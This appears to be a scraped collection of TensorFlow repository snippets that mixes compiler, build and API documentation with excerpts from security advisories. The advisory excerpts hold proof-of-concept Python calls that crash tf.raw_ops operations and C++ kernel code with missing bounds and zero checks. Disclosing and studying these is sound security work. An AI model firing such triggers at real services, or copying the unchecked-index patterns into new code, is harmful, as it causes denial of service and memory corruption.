DESCRIPTION: This C++ function sets the inferred shape for an output port of a node within TensorFlow's Grappler context. It fetches the unknown shape and attempts to set it using `ctx->set_output`. This function is part of the vulnerability chain as it passes the output port index to `set_output`, potentially leading to an out-of-bounds write if the index is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-032.md#_snippet_0

LANGUAGE: C++
CODE:
```
Status SetUnknownShape(const NodeDef* node, int output_port) {
  shape_inference::ShapeHandle shape =
      GetUnknownOutputShape(node, output_port);
  InferenceContext* ctx = GetContext(node);
  if (ctx == nullptr) {
    return errors::InvalidArgument("Missing context");
  }
  ctx->set_output(output_port, shape);
  return OkStatus();
}
```

----------------------------------------

TITLE: Importing Core Libraries for Data and Model
DESCRIPTION: Imports fundamental libraries required for data handling, JAX model definition, training, and general utilities, including NumPy, TensorFlow, functools, time, itertools, numpy.random, jax.numpy, and JAX's optimizers and stax modules.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite.ipynb#_snippet_5

LANGUAGE: Python
CODE:
```
import numpy as np
import tensorflow as tf
import functools

import time
import itertools

import numpy.random as npr

import jax.numpy as jnp
from jax import jit, grad, random
from jax.example_libraries import optimizers
from jax.example_libraries import stax
```

----------------------------------------

TITLE: Specifying Dependency - lit - Requirements
DESCRIPTION: Specifies the dependency on the lit package, fixing its version to 17.0.6. A single SHA256 hash is included to verify the integrity of the downloaded lit package file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/requirements_lock_3_11.txt#_snippet_1

LANGUAGE: Requirements
CODE:
```
lit==17.0.6 \
  --hash=sha256:dfa9af9b55fc4509a56be7bf2346f079d7f4a242d583b9f2e0b078fd0abae31b
```

----------------------------------------

TITLE: Triggering MatrixDiagV3 Nullptr Vulnerability (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the reference binding to nullptr vulnerability in `tf.raw_ops.MatrixDiagV3` by providing an empty list (`k=[]`) for the `k` argument. This bypasses the insufficient validation in affected TensorFlow versions, leading to undefined behavior when the implementation attempts to access elements of the empty tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-131.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

tf.raw_ops.MatrixDiagV3(
  diagonal=[1,0],
  k=[],
  num_rows=[1,2,3],
  num_cols=[4,5],
  padding_value=[],
  align='RIGHT_RIGHT')
```

----------------------------------------

TITLE: Demonstrating Segfault with tf.raw_ops.CompositeTensorVariantToComponents in Python
DESCRIPTION: This Python snippet provides a minimal example to demonstrate the segfault vulnerability (CVE-2022-41909) in TensorFlow's `tf.raw_ops.CompositeTensorVariantToComponents`. It attempts to process an `EmptyTensorList`, which is not a valid `CompositeTensorVariant`, causing the operation to crash. The expected output is a segfault.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-163.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

encode = tf.raw_ops.EmptyTensorList(element_dtype=tf.int32, element_shape=[10, 15], max_num_elements=2)
meta= ""
component=[tf.int32]

print(tf.raw_ops.CompositeTensorVariantToComponents(encoded=encode,metadata=meta,Tcomponents=component))
```

----------------------------------------

TITLE: Triggering RaggedTensorToTensor Vulnerability - Python TensorFlow
DESCRIPTION: This Python snippet demonstrates how to trigger a heap out-of-bounds or null pointer dereference vulnerability (CVE-2021-29608) in `tf.raw_ops.RaggedTensorToTensor`. By providing specific empty input tensors and arguments, it exploits insufficient validation in vulnerable TensorFlow versions, leading to undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-095.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

shape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
default_value = tf.constant(404, dtype=tf.int64)
row = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)
rows = [row]
types = ['ROW_SPLITS']

tf.raw_ops.RaggedTensorToTensor(
  shape=shape, values=values, default_value=default_value,
  row_partition_tensors=rows, row_partition_types=types)
```

----------------------------------------

TITLE: Triggering Heap OOB in TensorFlow Dilation2DBackpropInput (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap out-of-bounds write vulnerability in the `tf.raw_ops.Dilation2DBackpropInput` operation by providing specific invalid values for the `strides` and `rates` parameters, along with appropriately shaped input and output tensors. This serves as a proof-of-concept for the security flaw.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-054.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input_tensor = tf.constant([1.1] * 81, shape=[3, 3, 3, 3], dtype=tf.float32)
filter = tf.constant([], shape=[0, 0, 3], dtype=tf.float32)
out_backprop = tf.constant([1.1] * 1062, shape=[3, 2, 59, 3], dtype=tf.float32)

tf.raw_ops.Dilation2DBackpropInput(
  input=input_tensor, filter=filter, out_backprop=out_backprop,
  strides=[1, 40, 1, 1], rates=[1, 56, 56, 1], padding='VALID')
```

----------------------------------------

TITLE: Converting Control to Data Outputs in TF Executor While Loop (Before)
DESCRIPTION: This MLIR snippet shows a `while_body` function for a TensorFlow while loop using `tf_executor.graph`. It includes `tf.AssignVariableOp`, `tf.Add`, and `tf.Mul` operations. A `tf_executor.island` with `tf.NoOp` acts as a control barrier, aggregating control dependencies (`%assign_0_control`, `%assign_1_control`, `%add_control`, `%mul_control`) before fetching, potentially limiting inter-iteration parallelism.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_9

LANGUAGE: MLIR
CODE:
```
!tf_res = type tensor<!tf_type.resource<tensor<f32>>>
func @while_body(%arg0: !tf_res, %arg1: !tf_res, %arg2: tensor<f32>, %arg3: tensor<f32>) -> (!tf_res, !tf_res, tensor<f32>, tensor<f32>) {
  %graph:4 = tf_executor.graph {
    %assign_0_control = tf_executor.island wraps "tf.AssignVariableOp"(%arg0, %arg2) : (!tf_res, tensor<f32>) -> ()
    %assign_1_control = tf_executor.island wraps "tf.AssignVariableOp"(%arg1, %arg3) : (!tf_res, tensor<f32>) -> ()
    %add_out, %add_control = tf_executor.island wraps "tf.Add"(%arg2, %arg3) : (tensor<f32>, tensor<f32>) -> tensor<f32>
    %mul_out, %mul_control = tf_executor.island wraps "tf.Mul"(%arg2, %arg3) : (tensor<f32>, tensor<f32>) -> tensor<f32>
    %barrier = tf_executor.island(%assign_0_control, %assign_1_control, %add_control, %mul_control) wraps "tf.NoOp"() : () -> ()
    tf_executor.fetch %arg0, %arg1, %add_out, %mul_out, %barrier : !tf_res, !tf_res, tensor<f32>, tensor<f32>, tensor<i32>
  }
  return %graph#0, %graph#1, %graph#2, %graph#3 : !tf_res, !tf_res, tensor<f32>, tensor<f32>
}
```

----------------------------------------

TITLE: Lowering tfl.cast to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow Lite `tfl.cast` operation, which casts a tensor to a different data type, directly to the TOSA dialect's `tosa.CAST` operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_57

LANGUAGE: MLIR
CODE:
```
This operator is trivially lowered to tosa.CAST
```

LANGUAGE: MLIR
CODE:
```
tosa.CAST
```

----------------------------------------

TITLE: Defining TFLite Optional Tensor Index C++
DESCRIPTION: This snippet defines the `kTfLiteOptionalTensor` preprocessor constant. This constant uses the value -1 to represent an optional tensor that is not provided to an operator. The improper handling of this value during tensor access validation is the root cause of the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-005.md#_snippet_1

LANGUAGE: C++
CODE:
```
#define kTfLiteOptionalTensor (-1)
```

----------------------------------------

TITLE: Demonstrating Division by Zero Vulnerability in ResourceScatterDiv - Python
DESCRIPTION: This Python snippet demonstrates the division by zero vulnerability in the `tf.raw_ops.ResourceScatterDiv` operation. It attempts to perform a scatter division on a variable, where an update value of 0 is used, triggering the error because the underlying kernel does not handle division by zero correctly. Requires a vulnerable version of TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-115.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

v= tf.Variable([1,2,3])
tf.raw_ops.ResourceScatterDiv(
  resource=v.handle,
  indices=[1],
  updates=[0])
```

----------------------------------------

TITLE: Triggering TFSA-2021-050 Vulnerability in tf.raw_ops.IRFFT (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability (TFSA-2021-050) in TensorFlow's `tf.raw_ops.IRFFT` operation. It creates specific input tensors with carefully chosen values and shapes that lead to an internal `CHECK`-failure in the underlying Eigen code, causing program termination. The vulnerability arises when Eigen code operates on an empty matrix due to these specific inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-050.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

values = [-10.0] * 130
values[0] = -9.999999999999995
inputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)
inputs = tf.cast(inputs, dtype=tf.complex64)
fft_length = tf.constant([0], shape=[1], dtype=tf.int32)

tf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)
```

----------------------------------------

TITLE: Triggering Division by Zero in TensorFlow Conv2D (Python)
DESCRIPTION: This Python snippet demonstrates how to exploit the division by zero vulnerability in `tf.raw_ops.Conv2D`. By providing empty tensors with a specific shape for the input and filter, the underlying C++ kernel attempts a division by a zero dimension, leading to a runtime error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-015.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)

strides = [1, 1, 1, 1]
padding = "SAME"

tf.raw_ops.Conv2D(input=input, filter=filter, strides=strides, padding=padding)
```

----------------------------------------

TITLE: Triggering LoadAndRemapMatrix CHECK Failure in TensorFlow (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.LoadAndRemapMatrix`. It sets up input tensors with specific shapes and data types, including an empty tensor for `ckpt_path`, which deviates from the operation's expectation of a scalar, causing a `CHECK`-failure and process termination.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-049.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ckpt_path = tf.constant([], shape=[0], dtype=tf.string)
old_tensor_name = tf.constant("")
row_remapping = tf.constant([], shape=[0], dtype=tf.int64)
col_remapping = tf.constant([1], shape=[1], dtype=tf.int64)
initializing_values = tf.constant(1.0)

tf.raw_ops.LoadAndRemapMatrix(
    ckpt_path=ckpt_path, old_tensor_name=old_tensor_name,
    row_remapping=row_remapping, col_remapping=col_remapping,
    initializing_values=initializing_values, num_rows=0, num_cols=1)
```

----------------------------------------

TITLE: Demonstrating TF SparseDenseCwiseMul vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.SparseDenseCwiseMul`. It constructs sparse and dense tensors with specific empty shapes that bypass validation in affected TensorFlow versions, leading to internal CHECK failures or out-of-bounds memory access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-056.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

indices = tf.constant([], shape=[10, 0], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
shape = tf.constant([0, 0], shape=[2], dtype=tf.int64)
dense = tf.constant([], shape=[0], dtype=tf.int64)

tf.raw_ops.SparseDenseCwiseMul(
    sp_indices=indices, sp_values=values, sp_shape=shape, dense=dense)
```

----------------------------------------

TITLE: Triggering OOB Read in MatrixTriangularSolve (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the out-of-bounds read vulnerability in `tf.raw_ops.MatrixTriangularSolve`. It creates two empty TensorFlow tensors from empty NumPy arrays and passes them to the operation, exploiting the insufficient validation in the C++ kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-039.md#_snippet_1

LANGUAGE: Python
CODE:
```
import tensorflow as tf
import numpy as np

matrix_array = np.array([])
matrix_tensor = tf.convert_to_tensor(np.reshape(matrix_array,(1,0)),dtype=tf.float32)
rhs_array = np.array([])
rhs_tensor = tf.convert_to_tensor(np.reshape(rhs_array,(0,1)),dtype=tf.float32)

tf.raw_ops.MatrixTriangularSolve(matrix=matrix_tensor,rhs=rhs_tensor,lower=False,adjoint=False)
```

----------------------------------------

TITLE: Triggering Null Pointer Dereference using SparseFillEmptyRows (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the null pointer dereference vulnerability in tf.raw_ops.SparseFillEmptyRows. It shows the required inputs (indices, values, dense_shape, default_value) set to empty tensors or a default value, which, when processed by the vulnerable operation in affected TensorFlow versions, causes the crash. Requires TensorFlow installed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-053.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

indices = tf.constant([], shape=[0, 0], dtype=tf.int64)
values = tf.constant([], shape=[0], dtype=tf.int64)
dense_shape = tf.constant([], shape=[0], dtype=tf.int64)
default_value = 0

tf.raw_ops.SparseFillEmptyRows(
    indices=indices, values=values, dense_shape=dense_shape,
    default_value=default_value)
```

----------------------------------------

TITLE: Demonstrating Invalid Input in QuantizedConv2D (Python)
DESCRIPTION: This snippet shows how to trigger the TFSA-2022-075 vulnerability in `tf.raw_ops.QuantizedConv2D` by providing empty tensors ([]) with shape [0] for arguments such as `min_input`. This bypasses expected validation, leading to internal errors like dereferencing null pointers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-075.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf

input = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)
filter = tf.constant(1, shape=[1, 2, 3, 3], dtype=tf.quint8)

# bad args
min_input = tf.constant([], shape=[0], dtype=tf.float32)
max_input = tf.constant(0, shape=[], dtype=tf.float32)
min_filter = tf.constant(0, shape=[], dtype=tf.float32)
max_filter = tf.constant(0, shape=[], dtype=tf.float32)

tf.raw_ops.QuantizedConv2D(
  input=input,
  filter=filter,
  min_input=min_input,
  max_input=max_input,
  min_filter=min_filter,
  max_filter=max_filter,
  strides=[1, 1, 1, 1],
  padding="SAME")
```

----------------------------------------

TITLE: Showing Vulnerable Division By Zero in TFLite SVDF C++
DESCRIPTION: This C++ snippet from the TensorFlow Lite SVDF kernel (`svdf.cc`) shows the `TF_LITE_ENSURE_EQ` check where a division by zero can occur if the `rank` parameter is zero. The check `num_filters % rank, 0` becomes vulnerable when `rank` is 0, leading to a crash during model execution.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-086.md#_snippet_0

LANGUAGE: C++
CODE:
```
const int rank = params->rank;\n...\nTF_LITE_ENSURE_EQ(context, num_filters % rank, 0);
```

----------------------------------------

TITLE: Vulnerable TFLite Segment Sum Logic (C++)
DESCRIPTION: This C++ snippet shows the core loop logic of the segment sum operation in TensorFlow Lite. It demonstrates how 'output_index' is directly read from 'segment_ids_data' without validation, allowing negative values to potentially cause out-of-bounds writes to the 'output_data' buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-004.md#_snippet_0

LANGUAGE: C++
CODE:
```
  for (int i = 0; i < input_shape.Dims(0); i++) {
    int output_index = segment_ids_data[i];
    for (int j = 0; j < segment_flat_size; ++j) {
      output_data[output_index * segment_flat_size + j] +=
          input_data[i * segment_flat_size + j];
    }
  }
```

----------------------------------------

TITLE: Adding MLIR-HLO OPT LIT Test Suites (CMake)
DESCRIPTION: Adds additional LIT test suites specifically related to testing the 'mlir-hlo-opt' tool. These tests are located in the current source directory and also depend on the tools defined in MLIR_HLO_TEST_DEPENDS.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tests/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
add_lit_testsuites(MLIR_HLO_OPT ${CMAKE_CURRENT_SOURCE_DIR} DEPENDS ${MLIR_HLO_TEST_DEPENDS})
```

----------------------------------------

TITLE: Repacking and Renaming Libtensorflow Archives Bash
DESCRIPTION: Runs a utility script inside the Docker container to repack and rename the generated libtensorflow archives, organizing them into final distribution packages.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/tf_sig_build_dockerfiles/README.md#_snippet_13

LANGUAGE: Bash
CODE:
```
docker exec tf /usertools/repack_libtensorflow.sh /tf/pkg "-cpu-linux-x86_64"
```

LANGUAGE: Bash
CODE:
```
docker exec tf /usertools/repack_libtensorflow.sh /tf/pkg "-gpu-linux-x86_64"
```

----------------------------------------

TITLE: Get Root Content Object from Buffer Python
DESCRIPTION: A class method to initialize a Content object by getting the root object from a FlatBuffers buffer starting at a specified offset. This is a common pattern for deserializing FlatBuffers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/Content.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Lowering tf.Sum to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow `tf.Sum` operation, which computes the sum of elements across dimensions, to the TOSA dialect's `lower_reduce_op` with the `tosa.REDUCE_SUM` attribute. It supports the `keep_dims` attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_43

LANGUAGE: MLIR
CODE:
```
%output = tf.Sum(%input, %reduction_indices) {keep_dims}
```

LANGUAGE: MLIR
CODE:
```
%output = lower_reduce_op<tosa.REDUCE_SUM>(%input, %output.shape, %reduction_indices, keep_dims)
```

----------------------------------------

TITLE: Defining GELU HLO Module HLO
DESCRIPTION: This HLO snippet defines a computation graph for the GELU (Gaussian Error Linear Unit) activation function. It operates on a 3D tensor, using broadcasts for constants and a sequence of arithmetic and transcendental operations to compute the GELU formula. The module entry point calls this computation within a fusion operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_9

LANGUAGE: HLO
CODE:
```
HloModule m:

gelu {
  %param = bf16[6,512,4096] parameter(0)
  %constant_0 = bf16[] constant(0.5)
  %bcast_0 = bf16[6,512,4096] broadcast(bf16[] %constant_0), dimensions={}
  %constant_1 = bf16[] constant(1)
  %bcast_1 = bf16[6,512,4096] broadcast(bf16[] %constant_1), dimensions={}
  %constant_2 = bf16[] constant(0.79785)
  %bcast_2 = bf16[6,512,4096] broadcast(bf16[] %constant_2), dimensions={}
  %constant_3 = bf16[] constant(0.044708)
  %bcast_3 = bf16[6,512,4096] broadcast(bf16[] %constant_3), dimensions={}
  %square = bf16[6,512,4096] multiply(bf16[6,512,4096] %param, bf16[6,512,4096] %param)
  %cube = bf16[6,512,4096] multiply(bf16[6,512,4096] %square, bf16[6,512,4096] %param)
  %multiply_3 = bf16[6,512,4096] multiply(bf16[6,512,4096] %cube, bf16[6,512,4096] %bcast_3)
  %add_1 = bf16[6,512,4096] add(bf16[6,512,4096] %param, bf16[6,512,4096] %multiply_3)
  %multiply_2 = bf16[6,512,4096] multiply(bf16[6,512,4096] %add_1, bf16[6,512,4096] %bcast_2)
  %tanh_0 = bf16[6,512,4096] tanh(bf16[6,512,4096] %multiply_2)
  %add_0 = bf16[6,512,4096] add(bf16[6,512,4096] %tanh_0, bf16[6,512,4096] %bcast_1)
  %multiply_1 = bf16[6,512,4096] multiply(bf16[6,512,4096] %add_0, bf16[6,512,4096] %bcast_0)
  ROOT %multiply_0 = bf16[6,512,4096] multiply(bf16[6,512,4096] %param, bf16[6,512,4096] %multiply_1)
}

ENTRY main {
  %param = bf16[6,512,4096] parameter(0)
  ROOT fusion = bf16[6,512,4096] fusion(%param), kind=kLoop, calls=gelu
}
```

----------------------------------------

TITLE: Getting Root ImageProperties Object (Deprecated) (Python)
DESCRIPTION: Deprecated class method to get the root `ImageProperties` object from a buffer. Please use the `GetRootAs` method instead. Takes a buffer (`buf`) and an optional byte offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod\nGetRootAsImageProperties(\n    buf, offset=0\n)
```

----------------------------------------

TITLE: Lowering Strided Slice Op to TOSA (MLIR)
DESCRIPTION: This function lowers a strided slice operation to TOSA operations. It processes masks and negative indices to calculate the effective begin and end points, computes intermediate sizes and shapes, and then performs a sequence of TOSA SLICE and RESHAPE operations to achieve the desired strided slice effect. It currently has limitations regarding ellipsis masks and reverse strides.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_27

LANGUAGE: MLIR
CODE:
```
Value lower_strided_slice_op(Value %input, Value %begin_val, Value %end_val, Value %strides_val,
                               size_t begin_mask, size_t end_mask, size_t ellipsis_mask,
                               size_t new_axis_mask, size_t shrink_axis_mask)
{
    // Note: does not implement ellipsis_mask or reverse stride at this time
    assert(ellipsis_mask == 0)

    vector <size_t> begin(%begin_val.as_constant()), end(%end_val.as_constant()), strides(%strides_val.as_constant())
    vector <size_t> a1_start, a1_size, a2_shape, a3_start, a3_size, a4_shape

    for (int32 i = 0; i < %input.rank; i++) {
        if (begin_mask & (1 << i)) {
           begin[i] = 0
        }

        if (end_mask & (1 << i)) {
           end[i] = %input.shape[i]
        }

        // Wrap around index if begin and end are negative
        if (begin[i] < 0) {
           begin[i] += %input.shape[i]
        }

        if (end[i] < 0) {
           end[i] += %input.shape[i]
        }

        a1_start[i] = begin[i]
        a1_size[i] = end[i] - begin[i]

        a2_shape[i*2 + 0] = a1_size[i] / strides[i]
        a2_shape[i*2 + 1] = strides[i]

        a3_start[i*2 + 0] = 0
        a3_start[i*2 + 1] = 0

        if (shrink_axis_mask & (1 << i)) {
           a3_size[i*2 + 0] = 1
        } else {
           a3_size[i*2 + 0] = a1_size[i] / strides[i]
        }
        a3_size[i*2 + 1] = 1

        if (!(shrink_axis_mask & (1 << i))) {
           if (new_axis_mask & (1 << i)) {
              a4_shape.push_back(1)
           a4_shape.push_back((a1_size[i] / strides[i]))
        }
    }

    // Step 1: Slice the input array
    %a1_slice = tosa.SLICE(%input) {start=a1_start, size=a1_size}

    // Step 2: Reshape the sliced array: 2x as many dimensions as %input
    %a2_reshape = tosa.RESHAPE(%a1_slice) {new_shape=a2_shape}

    // Step 3: Take a slice of the [0] index along each of the strided dimensions (even dimensions)
    %a3_slice = tosa.SLICE(%a2_reshape) {start=a3_start, size=a3_size}

    // Step 4: Reshape the now-strided tensor back down to the desired number of dimensions
    %output = tosa.RESHAPE(%a3_slice) {new_shape=a4_shape}

    return %output
}
```

----------------------------------------

TITLE: Rewriting Composite Embedding Lookup to TFLite MLIR Operation C++
DESCRIPTION: Shows the C++ implementation within the TensorFlow Lite MLIR converter that replaces the body of a composite "embedding_lookup" function with the equivalent fused TFLite MLIR operation (`mlir::TFL::EmbeddingLookupOp`). It takes the original function arguments (embedding matrix and IDs) and uses them as operands for the new fused operation, then adds a return operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/operation_fusion.md#_snippet_4

LANGUAGE: c++
CODE:
```
void RewriteFunc() {
    Value lookup = func_.getArgument(1);
    Value value = func_.getArgument(0);
    auto output_type = func_.getType().getResult(0);

    OpBuilder builder(func_.getBody());
    auto op = builder.create<mlir::TFL::EmbeddingLookupOp>(
        func_.getLoc(), output_type, lookup, value);

    builder.create<mlir::ReturnOp>(func_.getLoc(), op.getResult());
  }
```

----------------------------------------

TITLE: Default Export Format Python
DESCRIPTION: A class variable specifying the default export format for the object detection model, which is TFLite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/object_detector/ObjectDetector.md#_snippet_10

LANGUAGE: python
CODE:
```
DEFAULT_EXPORT_FORMAT<ExportFormat.TFLITE: 'TFLITE'>
```

----------------------------------------

TITLE: Accessing Input Tensor Groups in Python
DESCRIPTION: Accesses a specific entry in the list of input tensor groups. This method allows retrieval of input tensor group definitions by their index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_13

LANGUAGE: python
CODE:
```
InputTensorGroups(
    j
)
```

----------------------------------------

TITLE: Decomposition of TF Stack Pop Operation (MLIR)
DESCRIPTION: Illustrates the sequence of MLIR operations used to replace a `tf.StackPop` operation during the stack decomposition pass. It involves reading buffer and size variables, decrementing the size, calculating slice offsets, extracting the element using `tf.Slice`, reshaping the result, and updating the size variable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_43

LANGUAGE: MLIR
CODE:
```
  %old_val = "tf.ReadVariableOp"(%buffer)
  %old_size = "tf.ReadVariableOp"(%size)
  %new_size = "tf.Sub"(%old_size, %const1)
  %offsets = "tf.ConcatV2"(%old_size, %other_dims_0s, %const0)
  %slice = "tf.Slice"(%old_val, %offsets, %slice_size_const)
  %pop_result = "tf.Reshape"(%slice, %elem_size_const)
  "tf.AssignVariableOp"(%size, %new_size)
```

----------------------------------------

TITLE: Handling Compiler Specific Options
DESCRIPTION: This snippet checks if the C++ compiler ID matches 'Clang'. If so, it appends the `-Wno-deprecated-declarations` flag to the `TF_TARGET_PRIVATE_OPTIONS` variable to suppress warnings about deprecated declarations, which are prevalent in some dependencies like protobuf.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_16

LANGUAGE: CMake
CODE:
```
set(TF_TARGET_PRIVATE_OPTIONS "")
if(CMAKE_CXX_COMPILER_ID MATCHES "Clang$")
  # TensorFlow uses a heap of deprecated proto fields so surpress these
  # warnings until they're fixed.
  list(APPEND TF_TARGET_PRIVATE_OPTIONS "-Wno-deprecated-declarations")
endif()
```

----------------------------------------

TITLE: Defining Expected Waveform Length (Python)
DESCRIPTION: Defines a class variable representing the expected length of the input audio waveform in number of samples required by the BrowserFftSpec model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/audio_classifier/BrowserFftSpec.md#_snippet_7

LANGUAGE: Python
CODE:
```
EXPECTED_WAVEFORM_LENGTH = 44032
```

----------------------------------------

TITLE: Example Proto Message Structure (SavedModel)
DESCRIPTION: Illustrates the structure of the `SavedModel` protobuf message, highlighting nested messages like `MetaGraphDef`, `GraphDef`, and `SavedObjectGraph` which may become large and require splitting.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/README.md#_snippet_1

LANGUAGE: proto
CODE:
```
message SavedModel {
  ...
  repeated MetaGraphDef meta_graphs = 2;
}
message MetaGraphDef {
  ...
  GraphDef graph_def = 2;
  SavedObjectGraph object_graph_def = 7;
}
message GraphDef {
  repeated NodeDef node = 1;
  FunctionDefLibrary library = 2;
  ...
}
```

----------------------------------------

TITLE: Lowering tf.Square to TOSA MLIR
DESCRIPTION: Documents the trivial lowering of the TensorFlow `tf.Square` operation, which computes the element-wise square of a tensor, to the TOSA dialect's `tosa.MUL` operation by multiplying the input tensor by itself.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_38

LANGUAGE: MLIR
CODE:
```
%output = tf.Square(%x)
```

LANGUAGE: MLIR
CODE:
```
%output = tosa.MUL(%x, %x)
```

----------------------------------------

TITLE: Using C++ Merger Class Methods
DESCRIPTION: Provides examples demonstrating how to call the `Merger::Merge` method using pre-loaded chunks and `Merger::Read` method to merge a chunked proto directly from a specified file prefix.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/proto_splitter/README.md#_snippet_4

LANGUAGE: c++
CODE:
```
// Merge
std::vector<std::unique_ptr<tsl::protobuf::Message>> my_chunks = GetMyChunks();
::proto_splitter::ChunkedMessage chunked_message = GetMyChunkedMessage();
my_project::MyProto my_proto;
Merger::Merge(my_chunks, chunked_message, &my_proto);

// Read
my_project::MyOtherProto my_other_proto;
Merger::Read("path/to/saved_model", &my_other_proto);
```

----------------------------------------

TITLE: Defining UNKNOWN ColorSpaceType Constant (Python)
DESCRIPTION: Represents the integer value assigned to the UNKNOWN color space type in the TFLite Support metadata schema. This value is used as a default or placeholder for unidentified color spaces.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ColorSpaceType.md#_snippet_0

LANGUAGE: Python
CODE:
```
0
```

----------------------------------------

TITLE: Parsing Deprecated AssociatedFile from Buffer (Python)
DESCRIPTION: A deprecated class method for parsing and returning the root `AssociatedFile` object from a flatbuffer buffer (`buf`) at a given `offset`. Users should transition to using the `GetRootAs` method for this functionality. It returns an `AssociatedFile` instance.
